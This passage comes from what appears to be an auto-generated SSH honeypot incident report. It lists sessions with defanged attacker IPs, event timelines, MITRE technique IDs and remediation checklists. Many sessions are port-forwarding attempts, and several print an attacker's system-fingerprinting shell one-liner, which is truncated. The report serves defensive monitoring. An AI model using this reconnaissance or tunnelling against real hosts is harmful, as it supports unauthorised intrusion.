| **Last Seen** | 2026-08-29 18:21 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:21:20` | `cowrie.session.connect` |
| `2026-08-29 18:21:21` | `cowrie.client.version` |
| `2026-08-29 18:21:21` | `cowrie.client.kex` |
| `2026-08-29 18:21:24` | `cowrie.login.success` |
| `2026-08-29 18:21:25` | `cowrie.direct-tcpip.request` |
| `2026-08-29 18:21:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.15.224[.]102` to AbuseIPDB if not already reported
- [ ] Block `218.15.224[.]102` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e20639bd3629

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 18:23 |
| **Last Seen** | 2026-08-29 18:23 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:23:30` | `cowrie.session.connect` |
| `2026-08-29 18:23:31` | `cowrie.client.version` |
| `2026-08-29 18:23:31` | `cowrie.client.kex` |
| `2026-08-29 18:23:36` | `cowrie.login.success` |
| `2026-08-29 18:23:39` | `cowrie.session.params` |
| `2026-08-29 18:23:39` | `cowrie.command.input` |
| `2026-08-29 18:23:39` | `cowrie.command.input` |
| `2026-08-29 18:23:39` | `cowrie.command.input` |
| `2026-08-29 18:23:39` | `cowrie.command.input` |
| `2026-08-29 18:23:39` | `cowrie.command.input` |
| `2026-08-29 18:23:39` | `cowrie.command.success` |
| `2026-08-29 18:23:39` | `cowrie.command.input` |
| `2026-08-29 18:23:39` | `cowrie.command.input` |
| `2026-08-29 18:23:39` | `cowrie.command.input` |
| `2026-08-29 18:23:39` | `cowrie.command.input` |
| `2026-08-29 18:23:40` | `cowrie.log.closed` |
| `2026-08-29 18:23:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31407932c41d

| Field | Detail |
|---|---|
| **Source IP** | `65.20.251[.]170` |
| **First Seen** | 2026-08-29 18:23 |
| **Last Seen** | 2026-08-29 18:23 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:23:47` | `cowrie.session.connect` |
| `2026-08-29 18:23:48` | `cowrie.client.version` |
| `2026-08-29 18:23:48` | `cowrie.client.kex` |
| `2026-08-29 18:23:49` | `cowrie.login.success` |
| `2026-08-29 18:23:49` | `cowrie.direct-tcpip.request` |
| `2026-08-29 18:23:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.251[.]170` to AbuseIPDB if not already reported
- [ ] Block `65.20.251[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f019422bb7a2

| Field | Detail |
|---|---|
| **Source IP** | `187.8.3[.]230` |
| **First Seen** | 2026-08-29 18:23 |
| **Last Seen** | 2026-08-29 18:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:23:55` | `cowrie.session.connect` |
| `2026-08-29 18:23:55` | `cowrie.client.version` |
| `2026-08-29 18:23:55` | `cowrie.client.kex` |
| `2026-08-29 18:23:57` | `cowrie.login.success` |
| `2026-08-29 18:23:58` | `cowrie.direct-tcpip.request` |
| `2026-08-29 18:24:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.8.3[.]230` to AbuseIPDB if not already reported
- [ ] Block `187.8.3[.]230` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-707dbb63ab78

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 18:25 |
| **Last Seen** | 2026-08-29 18:25 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:25:40` | `cowrie.session.connect` |
| `2026-08-29 18:25:41` | `cowrie.client.version` |
| `2026-08-29 18:25:41` | `cowrie.client.kex` |
| `2026-08-29 18:25:46` | `cowrie.login.success` |
| `2026-08-29 18:25:49` | `cowrie.session.params` |
| `2026-08-29 18:25:49` | `cowrie.command.input` |
| `2026-08-29 18:25:49` | `cowrie.command.input` |
| `2026-08-29 18:25:49` | `cowrie.command.input` |
| `2026-08-29 18:25:49` | `cowrie.command.input` |
| `2026-08-29 18:25:49` | `cowrie.command.input` |
| `2026-08-29 18:25:49` | `cowrie.command.success` |
| `2026-08-29 18:25:49` | `cowrie.command.input` |
| `2026-08-29 18:25:49` | `cowrie.command.input` |
| `2026-08-29 18:25:49` | `cowrie.command.input` |
| `2026-08-29 18:25:49` | `cowrie.command.input` |
| `2026-08-29 18:25:50` | `cowrie.log.closed` |
| `2026-08-29 18:25:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9b6a7a609a0

| Field | Detail |
|---|---|
| **Source IP** | `124.160.255[.]140` |
| **First Seen** | 2026-08-29 18:26 |
| **Last Seen** | 2026-08-29 18:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:26:03` | `cowrie.session.connect` |
| `2026-08-29 18:26:04` | `cowrie.client.version` |
| `2026-08-29 18:26:04` | `cowrie.client.kex` |
| `2026-08-29 18:26:06` | `cowrie.login.success` |
| `2026-08-29 18:26:06` | `cowrie.direct-tcpip.request` |
| `2026-08-29 18:26:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.160.255[.]140` to AbuseIPDB if not already reported
- [ ] Block `124.160.255[.]140` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-970c2c36c56c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 18:27 |
| **Last Seen** | 2026-08-29 18:27 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:27:43` | `cowrie.session.connect` |
| `2026-08-29 18:27:44` | `cowrie.client.version` |
| `2026-08-29 18:27:44` | `cowrie.client.kex` |
| `2026-08-29 18:27:49` | `cowrie.login.success` |
| `2026-08-29 18:27:52` | `cowrie.session.params` |
| `2026-08-29 18:27:52` | `cowrie.command.input` |
| `2026-08-29 18:27:52` | `cowrie.command.input` |
| `2026-08-29 18:27:52` | `cowrie.command.input` |
| `2026-08-29 18:27:52` | `cowrie.command.input` |
| `2026-08-29 18:27:52` | `cowrie.command.input` |
| `2026-08-29 18:27:52` | `cowrie.command.success` |
| `2026-08-29 18:27:52` | `cowrie.command.input` |
| `2026-08-29 18:27:52` | `cowrie.command.input` |
| `2026-08-29 18:27:52` | `cowrie.command.input` |
| `2026-08-29 18:27:52` | `cowrie.command.input` |
| `2026-08-29 18:27:53` | `cowrie.log.closed` |
| `2026-08-29 18:27:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39587376250d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 18:28 |
| **Last Seen** | 2026-08-29 18:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:28:45` | `cowrie.session.connect` |
| `2026-08-29 18:28:45` | `cowrie.client.version` |
| `2026-08-29 18:28:45` | `cowrie.client.kex` |
| `2026-08-29 18:28:46` | `cowrie.login.success` |
| `2026-08-29 18:28:46` | `cowrie.direct-tcpip.request` |
| `2026-08-29 18:28:47` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 18:28:47` | `cowrie.direct-tcpip.data` |
| `2026-08-29 18:28:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f05759e19dcb

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 18:29 |
| **Last Seen** | 2026-08-29 18:30 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:29:58` | `cowrie.session.connect` |
| `2026-08-29 18:29:59` | `cowrie.client.version` |
| `2026-08-29 18:29:59` | `cowrie.client.kex` |
| `2026-08-29 18:30:04` | `cowrie.login.success` |
| `2026-08-29 18:30:06` | `cowrie.session.params` |
| `2026-08-29 18:30:06` | `cowrie.command.input` |
| `2026-08-29 18:30:06` | `cowrie.command.input` |
| `2026-08-29 18:30:06` | `cowrie.command.input` |
| `2026-08-29 18:30:06` | `cowrie.command.input` |
| `2026-08-29 18:30:06` | `cowrie.command.input` |
| `2026-08-29 18:30:06` | `cowrie.command.success` |
| `2026-08-29 18:30:06` | `cowrie.command.input` |
| `2026-08-29 18:30:06` | `cowrie.command.input` |
| `2026-08-29 18:30:06` | `cowrie.command.input` |
| `2026-08-29 18:30:06` | `cowrie.command.input` |
| `2026-08-29 18:30:08` | `cowrie.log.closed` |
| `2026-08-29 18:30:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8656f985949

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 18:32 |
| **Last Seen** | 2026-08-29 18:32 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:32:06` | `cowrie.session.connect` |
| `2026-08-29 18:32:09` | `cowrie.client.version` |
| `2026-08-29 18:32:09` | `cowrie.client.kex` |
| `2026-08-29 18:32:21` | `cowrie.login.success` |
| `2026-08-29 18:32:27` | `cowrie.session.params` |
| `2026-08-29 18:32:27` | `cowrie.command.input` |
| `2026-08-29 18:32:27` | `cowrie.command.input` |
| `2026-08-29 18:32:27` | `cowrie.command.input` |
| `2026-08-29 18:32:27` | `cowrie.command.input` |
| `2026-08-29 18:32:27` | `cowrie.command.input` |
| `2026-08-29 18:32:27` | `cowrie.command.success` |
| `2026-08-29 18:32:27` | `cowrie.command.input` |
| `2026-08-29 18:32:27` | `cowrie.command.input` |
| `2026-08-29 18:32:27` | `cowrie.command.input` |
| `2026-08-29 18:32:27` | `cowrie.command.input` |
| `2026-08-29 18:32:29` | `cowrie.log.closed` |
| `2026-08-29 18:32:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc18c39bc5e1

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 18:32 |
| **Last Seen** | 2026-08-29 18:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:32:14` | `cowrie.session.connect` |
| `2026-08-29 18:32:15` | `cowrie.client.version` |
| `2026-08-29 18:32:15` | `cowrie.client.kex` |
| `2026-08-29 18:32:17` | `cowrie.login.success` |
| `2026-08-29 18:32:17` | `cowrie.direct-tcpip.request` |
| `2026-08-29 18:32:18` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 18:32:18` | `cowrie.direct-tcpip.data` |
| `2026-08-29 18:32:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f829126f1fe6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 18:34 |
| **Last Seen** | 2026-08-29 18:34 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:34:23` | `cowrie.session.connect` |
| `2026-08-29 18:34:26` | `cowrie.client.version` |
| `2026-08-29 18:34:26` | `cowrie.client.kex` |
| `2026-08-29 18:34:38` | `cowrie.login.success` |
| `2026-08-29 18:34:44` | `cowrie.session.params` |
| `2026-08-29 18:34:44` | `cowrie.command.input` |
| `2026-08-29 18:34:44` | `cowrie.command.input` |
| `2026-08-29 18:34:44` | `cowrie.command.input` |
| `2026-08-29 18:34:44` | `cowrie.command.input` |
| `2026-08-29 18:34:44` | `cowrie.command.input` |
| `2026-08-29 18:34:44` | `cowrie.command.success` |
| `2026-08-29 18:34:44` | `cowrie.command.input` |
| `2026-08-29 18:34:44` | `cowrie.command.input` |
| `2026-08-29 18:34:44` | `cowrie.command.input` |
| `2026-08-29 18:34:44` | `cowrie.command.input` |
| `2026-08-29 18:34:47` | `cowrie.log.closed` |
| `2026-08-29 18:34:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d05d5ddbd41

| Field | Detail |
|---|---|
| **Source IP** | `213.209.159[.]230` |
| **First Seen** | 2026-08-29 18:37 |
| **Last Seen** | 2026-08-29 18:37 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:37:19` | `cowrie.session.connect` |
| `2026-08-29 18:37:19` | `cowrie.client.version` |
| `2026-08-29 18:37:19` | `cowrie.client.kex` |
| `2026-08-29 18:37:19` | `cowrie.login.success` |
| `2026-08-29 18:37:21` | `cowrie.direct-tcpip.request` |
| `2026-08-29 18:37:21` | `cowrie.direct-tcpip.ja4` |
| `2026-08-29 18:37:21` | `cowrie.direct-tcpip.data` |
| `2026-08-29 18:37:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.209.159[.]230` to AbuseIPDB if not already reported
- [ ] Block `213.209.159[.]230` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b9a6c922b94

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 18:38 |
| **Last Seen** | 2026-08-29 18:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:38:46` | `cowrie.session.connect` |
| `2026-08-29 18:38:46` | `cowrie.client.version` |
| `2026-08-29 18:38:46` | `cowrie.client.kex` |
| `2026-08-29 18:38:47` | `cowrie.login.success` |
| `2026-08-29 18:38:48` | `cowrie.direct-tcpip.request` |
| `2026-08-29 18:38:48` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 18:38:48` | `cowrie.direct-tcpip.data` |
| `2026-08-29 18:38:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5d8a844697d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 18:43 |
| **Last Seen** | 2026-08-29 18:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:43:27` | `cowrie.session.connect` |
| `2026-08-29 18:43:27` | `cowrie.client.version` |
| `2026-08-29 18:43:27` | `cowrie.client.kex` |
| `2026-08-29 18:43:28` | `cowrie.login.success` |
| `2026-08-29 18:43:28` | `cowrie.direct-tcpip.request` |
| `2026-08-29 18:43:29` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 18:43:29` | `cowrie.direct-tcpip.data` |
| `2026-08-29 18:43:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f20f85d42a7e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 18:48 |
| **Last Seen** | 2026-08-29 18:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:48:29` | `cowrie.session.connect` |
| `2026-08-29 18:48:29` | `cowrie.client.version` |
| `2026-08-29 18:48:29` | `cowrie.client.kex` |
| `2026-08-29 18:48:30` | `cowrie.login.success` |
| `2026-08-29 18:48:30` | `cowrie.direct-tcpip.request` |
| `2026-08-29 18:48:30` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 18:48:30` | `cowrie.direct-tcpip.data` |
| `2026-08-29 18:48:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47024ee13066

| Field | Detail |
|---|---|
| **Source IP** | `196.189.124[.]218` |
| **First Seen** | 2026-08-29 18:51 |
| **Last Seen** | 2026-08-29 18:51 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:51:07` | `cowrie.session.connect` |
| `2026-08-29 18:51:08` | `cowrie.client.version` |
| `2026-08-29 18:51:08` | `cowrie.client.kex` |
| `2026-08-29 18:51:10` | `cowrie.login.success` |
| `2026-08-29 18:51:10` | `cowrie.direct-tcpip.request` |
| `2026-08-29 18:51:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.124[.]218` to AbuseIPDB if not already reported
- [ ] Block `196.189.124[.]218` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78ebea9e4188

| Field | Detail |
|---|---|
| **Source IP** | `209.145.59[.]90` |
| **First Seen** | 2026-08-29 18:51 |
| **Last Seen** | 2026-08-29 18:51 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 18:51:15` | `cowrie.session.connect` |
| `2026-08-29 18:51:15` | `cowrie.client.version` |
| `2026-08-29 18:51:15` | `cowrie.client.kex` |
| `2026-08-29 18:51:17` | `cowrie.login.success` |
| `2026-08-29 18:51:17` | `cowrie.direct-tcpip.request` |
| `2026-08-29 18:51:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.145.59[.]90` to AbuseIPDB if not already reported
- [ ] Block `209.145.59[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-418d66af01b1

| Field | Detail |
|---|---|
| **Source IP** | `118.123.116[.]93` |
| **First Seen** | 2026-08-29 18:53 |
| **Last Seen** | 2026-08-29 18:53 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
